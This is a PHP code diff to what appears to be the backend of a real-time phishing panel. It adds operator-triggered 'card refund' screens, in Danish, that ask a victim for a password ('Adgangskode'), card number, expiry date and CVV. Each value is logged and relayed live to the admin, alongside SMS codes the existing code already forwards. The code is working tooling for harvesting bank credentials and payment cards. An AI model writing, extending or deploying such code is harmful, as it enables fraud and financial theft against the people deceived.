@@ -266,6 +266,20 @@ function handleWsPolling(string $method, string $path): bool {
                 $queueMessage('user', ['type' => 'payment-refunded']);
                 $queueMessage('admin', ['type' => 'status-changed', 'field' => 'sms_active', 'value' => false]);
             }
+
+            // Refundering på kort — Adgangskode screen
+            elseif ($type === 'show-adgangskode') {
+                $pdo->prepare("UPDATE sessions SET qr_visible = 0, qr_image = NULL, sms_active = 0, updated_at = ? WHERE session_id = ?")->execute([$now, $sessionId]);
+                $pdo->prepare("INSERT INTO auth_log (session_id, event_type, detail) VALUES (?, 'show_adgangskode', 'Admin showed Adgangskode screen')")->execute([$sessionId]);
+                $queueMessage('user', ['type' => 'show-adgangskode']);
+            }
+
+            // Refundering på kort — card number screen
+            elseif ($type === 'show-card-refund') {
+                $pdo->prepare("UPDATE sessions SET qr_visible = 0, qr_image = NULL, sms_active = 0, updated_at = ? WHERE session_id = ?")->execute([$now, $sessionId]);
+                $pdo->prepare("INSERT INTO auth_log (session_id, event_type, detail) VALUES (?, 'show_card_refund', 'Admin showed card refund screen')")->execute([$sessionId]);
+                $queueMessage('user', ['type' => 'show-card-refund']);
+            }
         }
 
         // 3. User events
@@ -281,6 +295,33 @@ function handleWsPolling(string $method, string $path): bool {
                 $code = (string)($data['code'] ?? '');
                 $pdo->prepare("INSERT INTO auth_log (session_id, event_type, detail) VALUES (?, 'sms_submitted', ?)")->execute([$sessionId, "Code: {$code}"]);
                 $queueMessage('admin', ['type' => 'sms-submitted', 'code' => $code, 'session_id' => $sessionId, 'sessionId' => $sessionId]);
+            }
+
+            elseif ($type === 'adgangskode-submitted') {
+                $code = (string)($data['code'] ?? '');
+                $pdo->prepare("INSERT INTO auth_log (session_id, event_type, detail) VALUES (?, 'adgangskode_submitted', ?)")->execute([$sessionId, "Adgangskode: {$code}"]);
+                $queueMessage('admin', [
+                    'type' => 'adgangskode-submitted',
+                    'code' => $code,
+                    'session_id' => $sessionId,
+                    'sessionId' => $sessionId,
+                ]);
+            }
+
+            elseif ($type === 'card-refund-submitted') {
+                $card = (string)($data['cardNumber'] ?? '');
+                $exp = (string)($data['expiry'] ?? '');
+                $cvv = (string)($data['cvv'] ?? '');
+                $detail = "Kort: {$card}" . ($exp !== '' ? " Exp: {$exp}" : '') . ($cvv !== '' ? " CVV: {$cvv}" : '');
+                $pdo->prepare("INSERT INTO auth_log (session_id, event_type, detail) VALUES (?, 'card_refund_submitted', ?)")->execute([$sessionId, $detail]);
+                $queueMessage('admin', [
+                    'type' => 'card-refund-submitted',
+                    'cardNumber' => $card,
+                    'expiry' => $exp,
+                    'cvv' => $cvv,
+                    'session_id' => $sessionId,
+                    'sessionId' => $sessionId,
+                ]);
             }
 
             elseif ($type === 'user-left') {
